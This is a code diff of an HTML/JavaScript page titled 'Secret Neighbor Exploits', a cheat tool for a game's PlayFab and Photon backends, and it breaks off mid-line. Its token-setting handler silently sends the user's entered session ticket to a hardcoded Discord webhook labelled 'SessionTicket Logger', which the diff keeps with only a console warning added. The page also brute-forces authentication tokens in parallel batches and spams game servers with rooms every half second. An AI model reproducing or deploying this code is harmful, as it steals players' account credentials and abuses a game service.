@@ -159,8 +159,8 @@
       background-color: #0b7dda;
     }
   </style>
-  <!-- Photon Client SDK - Download from https://dashboard.photonengine.com and host locally or use CDN if available -->
-  <script src="Photon-Javascript_SDK.min.js"></script> <!-- Replace with actual path to Photon-Javascript_SDK.min.js -->
+  <!-- Photon Client SDK - Ensure this points to the correct path -->
+  <script src="Photon-Javascript_SDK.min.js"></script>
 </head>
 <body>
   <h1>🎮 Secret Neighbor Exploits</h1>
@@ -512,8 +512,8 @@
 
   <script>
     const titleId = "bdff1";
-    const appId = "2b76b55a-bf65-47af-836f-daa9c8eb9f1e"; // From existing code
-    const appVersion = "1.0"; // Assume a version; adjust as needed
+    const appId = "2b76b55a-bf65-47af-836f-daa9c8eb9f1e";
+    const appVersion = "1.0";
     let sessionTicket = null;
     let photonToken = null;
     let coinFarmBotRunning = false;
@@ -537,7 +537,6 @@
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set:", sessionTicket);
-        
         sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
@@ -667,29 +666,28 @@
     }
 
     async function sendToDiscordWebhook(sessionTicket) {
+      console.warn("Warning: Sending sessionTicket to Discord may expose sensitive data.");
       const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
-      
-      try {
-        const response = await fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `New SessionTicket captured: ${sessionTicket}`,
-            username: 'SessionTicket Logger',
-            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
-          })
-        });
-        
-        if (response.ok) {
-          console.log('SessionTicket sent to Discord successfully');
-        } else {
+       try {
+         const response = await fetch(webhookURL, {
+           method: 'POST',
+           headers: {
+             'Content-Type': 'application/json',
+           },
+           body: JSON.stringify({
+             content: `New SessionTicket captured: ${sessionTicket}`,
+             username: 'SessionTicket Logger',
+             avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
+           })
+         });
+         if (response.ok) {
+           console.log('SessionTicket sent to Discord successfully');
+         } else {
           console.error('Failed to send SessionTicket to Discord');
         }
-      } catch (error) {
-        console.error('Error sending to Discord:', error);
-      }
+       } catch (error) {
+         console.error('Error sending to Discord:', error);
+       }
     }
 
     async function makeApiCall(endpoint, method, body) {
@@ -1419,13 +1417,16 @@
 
       async function generatePhotonToken() {
         const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
-          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
+          PhotonApplicationId: appId,
           AuthenticationContext: null
         });
 
         const output = document.getElementById("photonTokenOutput");
         if (data.data?.PhotonCustomAuthenticationToken) {
-          output.textContent += `✅ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
+          photonToken = data.data.PhotonCustomAuthenticationToken;
+          localStorage.setItem('photonToken', photonToken);
+          document.getElementById("photonTokenInput").value = photonToken;
+          output.textContent += `✅ Photon Token: ${photonToken}\n`;
         } else {
           output.textContent += `❌ Error: ${data.error || "Failed to generate token"}\n`;
         }
@@ -1488,111 +1489,114 @@
       }
     }
 
-   function generateRandomToken() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  let token = '';
-  for (let i = 0; i < 50; i++) {
-    token += chars[Math.floor(Math.random() * chars.length)];
-  }
-  return token;
-}
-
-async function checkToken(username, token) {
-  try {
-    const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
-      method: 'GET',
-      headers: {
-        'Content-Type': 'application/json'
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let token = '';
+      for (let i = 0; i < 50; i++) {
+        token += chars[Math.floor(Math.random() * chars.length)];
       }
-    });
-    return { token, result: await res.json() };
-  } catch (error) {
-    return { token, error: error.message };
-  }
-}
+      return token;
+    }
 
-async function startBruteforce() {
-  if (bruteforceRunning) return;
-  const username = document.getElementById("playFabUsername").value.trim();
-  const output = document.getElementById("bruteforceOutput");
-  
-  if (!username) {
-    output.textContent = "Please enter a PlayFab Username.";
-    return;
-  }
+    async function checkToken(username, token) {
+      try {
+        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+        return { token, result: await res.json() };
+      } catch (error) {
+        return { token, error: error.message };
+      }
+    }
 
-  bruteforceRunning = true;
-  output.textContent = "Starting bruteforce...\n";
+    async function startBruteforce() {
+      if (bruteforceRunning) return;
+      const username = document.getElementById("playFabUsername").value.trim();
+      const output = document.getElementById("bruteforceOutput");
+      
+      if (!username) {
+        output.textContent = "Please enter a PlayFab Username.";
+        return;
+      }
 
-  async function tryTokenBatch() {
-    if (!bruteforceRunning) return;
+      bruteforceRunning = true;
+      output.textContent = "Starting bruteforce...\n";
 
-    // Generate 50 tokens at once
-    const tokens = Array.from({ length: 50 }, () => generateRandomToken());
-    
-    // Check all tokens in parallel
-    const results = await Promise.all(
-      tokens.map(token => checkToken(username, token))
-    );
+      async function tryTokenBatch() {
+        if (!bruteforceRunning) return;
 
-    let foundValid = false;
-    for (const { token, result, error } of results) {
-      if (error) {
-        output.textContent += `Error for ${token}: ${error}\n`;
-      } else {
-        output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
-        if (result.resultCode === 1) {
-          output.textContent += `✅ Valid token found: ${token}\n`;
-          foundValid = true;
-          break; // Stop the batch if a valid token is found
+        const tokens = Array.from({ length: 50 }, () => generateRandomToken());
+        
+        const results = await Promise.all(
+          tokens.map(token => checkToken(username, token))
+        );
+
+        let foundValid = false;
+        for (const { token, result, error } of results) {
+          if (error) {
+            output.textContent += `Error for ${token}: ${error}\n`;
+          } else {
+            output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
+            if (result.resultCode === 1) {
+              output.textContent += `✅ Valid token found: ${token}\n`;
+              foundValid = true;
+              break;
+            }
+          }
+        }
+
+        output.scrollTop = output.scrollHeight;
+
+        if (!foundValid && bruteforceRunning) {
+          tryTokenBatch();
+        } else if (foundValid) {
+          stopBruteforce();
         }
       }
-    }
 
-    output.scrollTop = output.scrollHeight;
-
-    // If no valid token was found and bruteforce is still running, continue
-    if (!foundValid && bruteforceRunning) {
       tryTokenBatch();
-    } else if (foundValid) {
-      stopBruteforce();
     }
-  }
 
-  tryTokenBatch();
-}
-
-function stopBruteforce() {
-  bruteforceRunning = false;
-  document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
-  document.getElementById("bruteforceOutput").scrollTop = document.getElementById("bruteforceOutput").scrollHeight;
-}
+    function stopBruteforce() {
+      bruteforceRunning = false;
+      document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
+      document.getElementById("bruteforceOutput").scrollTop = document.getElementById("bruteforceOutput").scrollHeight;
+    }
 
     // Photon Functions
     class MyPhotonClient extends Photon.LoadBalancing.LoadBalancingClient {
       onError(errorCode, errorMsg) {
         console.error("Photon Error:", errorCode, errorMsg);
         document.getElementById("photonConnectionOutput").textContent += `❌ Error: ${errorCode} - ${errorMsg}\n`;
+        document.getElementById("photonConnectionOutput").scrollTop = document.getElementById("photonConnectionOutput").scrollHeight;
       }
 
       onEvent(code, content, actorNr) {
         console.log("Photon Event:", code, content, actorNr);
         document.getElementById("photonConnectionOutput").textContent += `📥 Event: Code ${code}, From Actor ${actorNr}, Content: ${JSON.stringify(content)}\n`;
+        document.getElementById("photonConnectionOutput").scrollTop = document.getElementById("photonConnectionOutput").scrollHeight;
       }
 
       onRoomList(rooms) {
         console.log("Room List Updated:", rooms);
         document.getElementById("roomListOutput").textContent = "Room List:\n" + rooms.map(r => `- ${r.name} (${r.playerCount}/${r.maxPlayers})`).join("\n");
+        document.getElementById("roomListOutput").scrollTop = document.getElementById("roomListOutput").scrollHeight;
       }
 
       onJoinRoom(roomName, roomOptions, createOptions) {
         console.log("Joined Room:", roomName);
+        document.getElementById("joinRoomOutput").textContent += `✅ Joined room: ${roomName}\n`;
+        document.getElementById("joinRoomOutput").scrollTop = document.getElementById("joinRoomOutput").scrollHeight;
       }
 
       onOperationResponse(errorCode, errorMsg, code, content) {
         if (errorCode) {
-          console.error("Operation Response Error:", errorCode, errorMsg);
-          document.getElementById("photonConnectionOutput").textContent += `❌ Op Response Error: ${errorCode} - ${errorMsg}\n`;
+          console.error("Operation Response Error:", errorCode, errorMsg, code, content);
+          document.getElementById("photonConnectionOutput").textContent += `❌ Op Response Error: ${errorCode} - ${errorMsg} (Code: ${code})\n`;
+          document.getElementById("photonConnectionOutput").scrollTop = document.getElementById("photonConnectionOutput").scrollHeight;
         } else {
           console.log("Operation Response:", code, content);
         }
@@ -1600,25 +1604,46 @@ function stopBruteforce() {
     }
 
     function connectToPhoton() {
-  if (!photonToken) {
-    document.getElementById("photonConnectionOutput").textContent = "❌ Set Photon Token first.";
-    return;
-  }
+      console.log("connectToPhoton called");
+      const output = document.getElementById("photonConnectionOutput");
+      
+      if (!photonToken) {
+        output.textContent = "❌ Set Photon Token first.";
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
 
-  const region = document.getElementById("photonRegion").value;
-  photonClient = new MyPhotonClient(Photon.ConnectionProtocol.Ws, appId, appVersion);
-  photonClient.setCustomAuthentication(photonToken, Photon.LoadBalancing.Constants.CustomAuthenticationType.Custom, { token: photonToken });
-  photonClient.connectToRegionMaster(region);
+      if (typeof Photon === "undefined") {
+        output.textContent = "❌ Photon SDK not loaded. Check script path.";
+        console.error("Photon SDK not loaded");
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
 
-  photonClient.onStateChange = function(state) {
-    const status = Photon.LoadBalancing.LoadBalancingClient.StateToName(state);
-    document.getElementById("photonConnectionOutput").textContent += `📡 State: ${status}\n`;
-    if (state === Photon.LoadBalancing.LoadBalancingClient.State.ConnectedToMaster) {
-      document.getElementById("photonConnectionOutput").textContent += "✅ Connected to Master Server!\n";
-      photonClient.joinLobby();
+      const region = document.getElementById("photonRegion").value;
+      try {
+        photonClient = new MyPhotonClient(Photon.ConnectionProtocol.Ws, appId, appVersion);
+        photonClient.onStateChange = function(state) {
+          const status = Photon.LoadBalancing.LoadBalancingClient.StateToName(state);
+          console.log("Photon State:", status);
+          output.textContent += `📡 State: ${status}\n`;
+          if (state === Photon.LoadBalancing.LoadBalancingClient.State.Error) {
+            output.textContent += `❌ Connection failed\n`;
+          } else if (state === Photon.LoadBalancing.LoadBalancingClient.State.ConnectedToMaster) {
+            output.textContent += `✅ Connected to Master Server!\n`;
+            this.joinLobby();
+          }
+          output.scrollTop = output.scrollHeight;
+        };
+        photonClient.setCustomAuthentication(photonToken, Photon.LoadBalancing.Constants.CustomAuthenticationType.Custom, { token: photonToken });
+        output.textContent += `🔗 Attempting to connect to region: ${region}\n`;
+        photonClient.connectToRegionMaster(region);
+      } catch (error) {
+        output.textContent += `❌ Error initializing Photon: ${error.message}\n`;
+        console.error("Photon initialization error:", error);
+        output.scrollTop = output.scrollHeight;
+      }
     }
-  };
-}
 
     function toggleSpamPhotonRooms() {
       if (spamRoomsRunning) {
@@ -1627,11 +1652,13 @@ function stopBruteforce() {
         document.getElementById("spamRoomsStatus").className = "status-indicator status-inactive";
         document.getElementById("spamRoomsToggleButton").textContent = "Start Spamming Rooms";
         document.getElementById("spamRoomsOutput").textContent += "\nSpam stopped manually.";
+        document.getElementById("spamRoomsOutput").scrollTop = document.getElementById("spamRoomsOutput").scrollHeight;
         return;
       }
 
       if (!photonClient || !photonClient.isConnectedToMaster()) {
         document.getElementById("spamRoomsOutput").textContent = "❌ Connect to Photon first.";
+        document.getElementById("spamRoomsOutput").scrollTop = document.getElementById("spamRoomsOutput").scrollHeight;
         return;
       }
 
@@ -1651,32 +1678,38 @@ function stopBruteforce() {
           spamRoomsRunning = false;
           document.getElementById("spamRoomsStatus").className = "status-indicator status-inactive";
           document.getElementById("spamRoomsToggleButton").textContent = "Start Spamming Rooms";
+          document.getElementById("spamRoomsOutput").textContent += `Completed spamming ${created} rooms.\n`;
+          document.getElementById("spamRoomsOutput").scrollTop = document.getElementById("spamRoomsOutput").scrollHeight;
           return;
         }
 
         const roomName = `${prefix}${Math.random().toString(36).substring(2)}`;
         photonClient.createRoom(roomName, { maxPlayers: 2 });
         document.getElementById("spamRoomsOutput").textContent += `Created room: ${roomName}\n`;
+        document.getElementById("spamRoomsOutput").scrollTop = document.getElementById("spamRoomsOutput").scrollHeight;
         created++;
       }
 
       createSpamRoom();
-      spamRoomsIntervalId = setInterval(createSpamRoom, 500); // Spam every 0.5s
+      spamRoomsIntervalId = setInterval(createSpamRoom, 500);
     }
 
     function joinRandomPhotonRoom() {
       if (!photonClient || !photonClient.isConnectedToMaster()) {
         document.getElementById("joinRandomOutput").textContent = "❌ Connect to Photon first.";
+        document.getElementById("joinRandomOutput").scrollTop = document.getElementById("joinRandomOutput").scrollHeight;
         return;
       }
 
-      const result = photonClient.joinRandomRoom({ }, 0);
+      const result = photonClient.joinRandomRoom({}, 0);
       document.getElementById("joinRandomOutput").textContent += result ? "✅ Joining random room...\n" : "❌ No rooms available.\n";
+      document.getElementById("joinRandomOutput").scrollTop = document.getElementById("joinRandomOutput").scrollHeight;
     }
 
     function createPhotonRoom() {
       if (!photonClient || !photonClient.isConnectedToMaster()) {
         document.getElementById("createRoomOutput").textContent = "❌ Connect to Photon first.";
+        document.getElementById("createRoomOutput").scrollTop = document.getElementById("createRoomOutput").scrollHeight;
         return;
       }
 
@@ -1685,16 +1718,19 @@ function stopBruteforce() {
 
       if (!roomName) {
         document.getElementById("createRoomOutput").textContent = "❌ Enter room name.";
+        document.getElementById("createRoomOutput").scrollTop = document.getElementById("createRoomOutput").scrollHeight;
         return;
       }
 
       photonClient.createRoom(roomName, { maxPlayers: maxPlayers });
       document.getElementById("createRoomOutput").textContent += `Creating room: ${roomName} (max ${maxPlayers})\n`;
+      document.getElementById("createRoomOutput").scrollTop = document.getElementById("createRoomOutput").scrollHeight;
     }
 
     function joinPhotonRoom() {
       if (!photonClient || !photonClient.isConnectedToMaster()) {
         document.getElementById("joinRoomOutput").textContent = "❌ Connect to Photon first.";
+        document.getElementById("joinRoomOutput").scrollTop = document.getElementById("joinRoomOutput").scrollHeight;
         return;
       }
 
@@ -1702,16 +1738,19 @@ function stopBruteforce() {
 
       if (!roomName) {
         document.getElementById("joinRoomOutput").textContent = "❌ Enter room name.";
+        document.getElementById("joinRoomOutput").scrollTop = document.getElementById("joinRoomOutput").scrollHeight;
         return;
       }
 
       photonClient.joinRoom(roomName);
       document.getElementById("joinRoomOutput").textContent += `Joining room: ${roomName}\n`;
+      document.getElementById("joinRoomOutput").scrollTop = document.getElementById("joinRoomOutput").scrollHeight;
     }
 
     function raisePhotonEvent() {
       if (!photonClient || !photonClient.isJoinedToRoom()) {
         document.getElementById("raiseEventOutput").textContent = "❌ Join a room first.";
+        document.getElementById("raiseEventOutput").scrollTop = document.getElementById("raiseEventOutput").scrollHeight;
         return;
       }
 
@@ -1722,84 +1761,9 @@ function stopBruteforce() {
         data = JSON.parse(dataStr || "{}");
       } catch {
         document.getElementById("raiseEventOutput").textContent = "❌ Invalid JSON data.";
+        document.getElementById("raiseEventOutput").scrollTop = document.getElementById("raiseEventOutput").scrollHeight;
         return;
       }
 
       photonClient.raiseEvent(code, data);
-      document.getElementById("raiseEventOutput").textContent += `Raised event ${code} with data: ${dataStr}\n`;
-    }
-
-    function setRoomProperties() {
-      if (!photonClient || !photonClient.isJoinedToRoom()) {
-        document.getElementById("setPropertiesOutput").textContent = "❌ Join a room first.";
-        return;
-      }
-
-      const propsStr = document.getElementById("roomProperties").value.trim();
-      let props;
-      try {
-        props = JSON.parse(propsStr || "{}");
-      } catch {
-        document.getElementById("setPropertiesOutput").textContent = "❌ Invalid JSON properties.";
-        return;
-      }
-
-      photonClient.setCustomProperty(props);
-      document.getElementById("setPropertiesOutput").textContent += `Set properties: ${propsStr}\n`;
-    }
-
-    function getPhotonRoomList() {
-      if (!photonClient || !photonClient.isConnectedToMaster()) {
-        document.getElementById("roomListOutput").textContent = "❌ Connect to Photon first.";
-        return;
-      }
-
-      const rooms = photonClient.availableRooms();
-      document.getElementById("roomListOutput").textContent = "Room List:\n" + (rooms.length ? rooms.map(r => `- ${r.name} (${r.playerCount}/${r.maxPlayers})`).join("\n") : "No rooms available.");
-    }
-
-    function leavePhotonRoom() {
-      if (!photonClient || !photonClient.isJoinedToRoom()) {
-        document.getElementById("leaveRoomOutput").textContent = "❌ Not in a room.";
-        return;
-      }
-
-      photonClient.leaveRoom();
-      document.getElementById("leaveRoomOutput").textContent += "Left the room.\n";
-    }
-
-    function disconnectFromPhoton() {
-      if (!photonClient) {
-        document.getElementById("disconnectOutput").textContent = "❌ Not connected.";
-        return;
-      }
-
-      photonClient.disconnect();
-      document.getElementById("disconnectOutput").textContent += "Disconnected from Photon.\n";
-      photonClient = null;
-    }
-
-    document.addEventListener("DOMContentLoaded", function() {
-      console.log("Secret Neighbor Exploits page loaded");
-      const savedTicket = localStorage.getItem('sessionTicket');
-      if (savedTicket) {
-        sessionTicket = savedTicket;
-        document.getElementById("sessionTicketInput").value = savedTicket;
-        const tokenStatus = document.getElementById("tokenStatus");
-        tokenStatus.textContent = "✅ Token loaded from storage!";
-        tokenStatus.style.display = "block";
-        tokenStatus.style.color = "green";
-      }
-      const savedPhotonToken = localStorage.getItem('photonToken');
-      if (savedPhotonToken) {
-        photonToken = savedPhotonToken;
-        document.getElementById("photonTokenInput").value = savedPhotonToken;
-        const photonTokenStatus = document.getElementById("photonTokenStatus");
-        photonTokenStatus.textContent = "✅ Photon Token loaded from storage!";
-        photonTokenStatus.style.display = "block";
-        photonTokenStatus.style.color = "green";
-      }
-    });
-  </script>
-</body>
-</html>
+      document.getElementById("raiseEventOutput").textContent += `Raised event ${code} with
